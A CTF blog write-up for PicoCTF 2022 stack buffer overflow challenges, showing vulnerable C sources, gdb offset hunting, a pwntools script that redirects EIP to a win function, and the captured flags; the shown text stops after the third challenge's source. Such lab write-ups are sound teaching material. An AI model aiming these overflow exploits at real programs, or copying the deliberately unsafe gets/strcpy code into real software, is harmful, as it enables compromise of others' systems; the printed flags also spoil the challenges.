<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="PicoCTF 2022 - Binary Exploitation" /><meta name="author" content="h3xit" /><meta property="og:locale" content="en" /><meta name="description" content="Binary Overflow 0" /><meta property="og:description" content="Binary Overflow 0" /><link rel="canonical" href="https://h3xitsec.github.io/posts/picoctf-binary/" /><meta property="og:url" content="https://h3xitsec.github.io/posts/picoctf-binary/" /><meta property="og:site_name" content="h3xitâ€™s ~" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-30T00:00:00-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="PicoCTF 2022 - Binary Exploitation" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@h3xit" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"h3xit"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://h3xitsec.github.io/posts/picoctf-binary/"},"description":"Binary Overflow 0","url":"https://h3xitsec.github.io/posts/picoctf-binary/","@type":"BlogPosting","headline":"PicoCTF 2022 - Binary Exploitation","dateModified":"2022-04-03T22:51:45-04:00","datePublished":"2022-03-30T00:00:00-04:00","@context":"https://schema.org"}</script><title>PicoCTF 2022 - Binary Exploitation | h3xit's ~</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="h3xit's ~"><meta name="application-name" content="h3xit's ~"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">h3xit's ~</a></div><div class="site-subtitle font-italic">CTF Writeups and other stuff about my journey into cybersecurity</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/h3xitsec" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['h3xit','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>PicoCTF 2022 - Binary Exploitation</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>PicoCTF 2022 - Binary Exploitation</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/h3xitsec">h3xit</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-03-30 00:00:00 -0400" data-toggle="tooltip" data-placement="bottom" title="Wed, Mar 30, 2022, 12:00 AM -0400" >Mar 30</em> </span> <span> Updated <em class="timeago" date="2022-04-03 22:51:45 -0400 " data-toggle="tooltip" data-placement="bottom" title="Sun, Apr 3, 2022, 10:51 PM -0400" >Apr 3</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3096 words"> <em>17 min</em> read</span></div></div></div><div class="post-content"><h1 id="binary-overflow-0">Binary Overflow 0</h1><h2 id="challenge">Challenge<a href="#challenge" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>Smash the stack
Let's start off simple, can you overflow the correct buffer?
The program is available here.
You can view source here. And connect with it using:
nc saturn.picoctf.net 55986
</pre></table></code></div></div><h2 id="static-code-analysis">Static code analysis<a href="#static-code-analysis" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;signal.h&gt;
</span>
<span class="cp">#define FLAGSIZE_MAX 64
</span>
<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="n">FLAGSIZE_MAX</span><span class="p">];</span>

<span class="kt">void</span> <span class="nf">sigsegv_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">){</span>
  <span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
  
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s %s"</span><span class="p">,</span> <span class="s">"Please create 'flag.txt' in this directory with your"</span><span class="p">,</span>
                    <span class="s">"own debugging flag.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  
  <span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span><span class="n">FLAGSIZE_MAX</span><span class="p">,</span><span class="n">f</span><span class="p">);</span>
  <span class="n">signal</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">sigsegv_handler</span><span class="p">);</span> <span class="c1">// Set up signal handler</span>
  
  <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>


  <span class="n">printf</span><span class="p">(</span><span class="s">"Input: "</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="kt">char</span> <span class="n">buf1</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">buf1</span><span class="p">);</span> 
  <span class="n">vuln</span><span class="p">(</span><span class="n">buf1</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"The program will exit now</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>We can see that the program handles SIGSEGV by itself by giving away the flag. We should only have to overflow the buffer, which has a size of 16, to cause a SIGSEGV fault</p><h2 id="solution">Solution<a href="#solution" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>Overflow the buffer<div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc saturn.picoctf.net 55986
Input: AAAAAAAAAAAAAAAAAAAA
picoCTF<span class="o">{</span>ov3rfl0ws_ar3nt_that_bad_ee2fd2b1<span class="o">}</span>
</pre></table></code></div></div></ul><h1 id="buffer-overflow-1">Buffer Overflow 1</h1><h2 id="challenge-1">Challenge<a href="#challenge-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>Control the return address
Now we're cooking! You can overflow the buffer and return to the flag function in the program.
You can view source here.
And connect with it using nc saturn.picoctf.net 59626
</pre></table></code></div></div><h2 id="solution-1">Solution<a href="#solution-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>Find padding to EIP</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>pattern create 150
<span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'</span>

gdb-peda<span class="nv">$ </span>run
Starting program: vuln 
Please enter your string: 
AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA
Okay, <span class="nb">time </span>to <span class="k">return</span>... Fingers Crossed... Jumping to 0x41414641

Program received signal SIGSEGV, Segmentation fault.
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x41 <span class="o">(</span><span class="s1">'A'</span><span class="o">)</span>
EBX: 0x61414145 <span class="o">(</span><span class="s1">'EAAa'</span><span class="o">)</span>
ECX: 0x41 <span class="o">(</span><span class="s1">'A'</span><span class="o">)</span>
EDX: 0xffffffff 
ESI: 0x1 
EDI: 0x80490e0 <span class="o">(</span>&lt;_start&gt;:       endbr32<span class="o">)</span>
EBP: 0x41304141 <span class="o">(</span><span class="s1">'AA0A'</span><span class="o">)</span>
ESP: 0xff9e05e0 <span class="o">(</span><span class="s2">"bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span><span class="o">)</span>
EIP: 0x41414641 <span class="o">(</span><span class="s1">'AFAA'</span><span class="o">)</span>
EFLAGS: 0x10282 <span class="o">(</span>carry parity adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x41414641
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xff9e05e0 <span class="o">(</span><span class="s2">"bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span><span class="o">)</span>
0004| 0xff9e05e4 <span class="o">(</span><span class="s2">"AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span><span class="o">)</span>
0008| 0xff9e05e8 <span class="o">(</span><span class="s2">"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span><span class="o">)</span>
0012| 0xff9e05ec <span class="o">(</span><span class="s2">"2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span><span class="o">)</span>
0016| 0xff9e05f0 <span class="o">(</span><span class="s2">"AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span><span class="o">)</span>
0020| 0xff9e05f4 <span class="o">(</span><span class="s2">"A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span><span class="o">)</span>
0024| 0xff9e05f8 <span class="o">(</span><span class="s2">"IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span><span class="o">)</span>
0028| 0xff9e05fc <span class="o">(</span><span class="s2">"AA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span><span class="o">)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 <span class="k">in</span> ?? <span class="o">()</span>

gdb-peda<span class="nv">$ </span>pattern offset 0x41414641
1094796865 found at offset: 44
</pre></table></code></div></div><ul><li>Find address of vulnerable function to jump to</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>info functions
<span class="o">[</span>...]
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  win
0x08049281  vuln
0x080492c4  main
0x0804933e  get_return_address
0x08049350  __libc_csu_init
0x080493c0  __libc_csu_fini
0x080493c5  __x86.get_pc_thunk.bp
0x080493cc  _fini
</pre></table></code></div></div><p>The address of the win function is 0x080491f6</p><ul><li>Exploit and win</ul><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">warnings</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="c1">## Configuration
</span><span class="n">binary</span> <span class="o">=</span> <span class="s">'/home/h3x/work/ctf/picoctf/bof1/vuln'</span>
<span class="n">eip_offset</span> <span class="o">=</span> <span class="mi">44</span>
<span class="n">targetAddr</span> <span class="o">=</span> <span class="mh">0x080491f6</span>
<span class="n">promptChar</span> <span class="o">=</span> <span class="s">':'</span>

<span class="n">warnings</span><span class="p">.</span><span class="n">filterwarnings</span><span class="p">(</span><span class="s">"ignore"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>  <span class="c1"># ('server', 'port')
</span>        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>  <span class="c1"># Run locally
</span>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="c1">## Setup and start process
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Exploiting {a}:{b}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">b</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Exploiting {a}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">binary</span><span class="p">))</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'error'</span>
<span class="n">proc</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1">## Exploit
</span><span class="k">print</span><span class="p">(</span><span class="s">'  [*] EIP offset is set at {a}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">eip_offset</span><span class="p">))</span>

<span class="c1"># payload
</span><span class="n">chain</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">chain</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'A'</span> <span class="o">*</span> <span class="n">eip_offset</span><span class="p">)</span>
<span class="n">chain</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">targetAddr</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">chain</span><span class="p">)</span>

<span class="c1"># run the exploit
</span><span class="k">print</span><span class="p">(</span><span class="s">'  [*] Sending payload'</span><span class="p">)</span>
<span class="c1">#proc.recvuntil(promptChar).decode()
</span><span class="n">proc</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">promptChar</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'  [*] Printing program output'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">proc</span><span class="p">.</span><span class="n">readall</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">,</span><span class="n">errors</span><span class="o">=</span><span class="s">'ignore'</span><span class="p">))</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python solve.py REMOTE <span class="o">{</span><span class="s1">'saturn.picoctf.net'</span>,59626<span class="o">}</span>
Exploiting saturn.picoctf.net:59626
  <span class="o">[</span><span class="k">*</span><span class="o">]</span> EIP offset is <span class="nb">set </span>at 44
  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending payload
  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Printing program output
 
Okay, <span class="nb">time </span>to <span class="k">return</span>... Fingers Crossed... Jumping to 0x80491f6
picoCTF<span class="o">{</span>addr3ss3s_ar3_3asy_60fac6aa<span class="o">}</span>
</pre></table></code></div></div><h1 id="buffer-overflow-2">Buffer Overflow 2</h1><h2 id="challenge-2">Challenge<a href="#challenge-2" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Control the return address and arguments
</pre></table></code></div></div><h2 id="static-code-analysis-1">Static Code Analysis<a href="#static-code-analysis-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
</span>
<span class="cp">#define BUFSIZE 100
#define FLAGSIZE 64
</span>
<span class="kt">void</span> <span class="nf">win</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">arg1</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">arg2</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">FLAGSIZE</span><span class="p">];</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s %s"</span><span class="p">,</span> <span class="s">"Please create 'flag.txt' in this directory with your"</span><span class="p">,</span>
                    <span class="s">"own debugging flag.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">FLAGSIZE</span><span class="p">,</span><span class="n">f</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">arg1</span> <span class="o">!=</span> <span class="mh">0xCAFEF00D</span><span class="p">)</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">arg2</span> <span class="o">!=</span> <span class="mh">0xF00DF00D</span><span class="p">)</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(){</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  
  <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"Please enter your string: "</span><span class="p">);</span>
  <span class="n">vuln</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
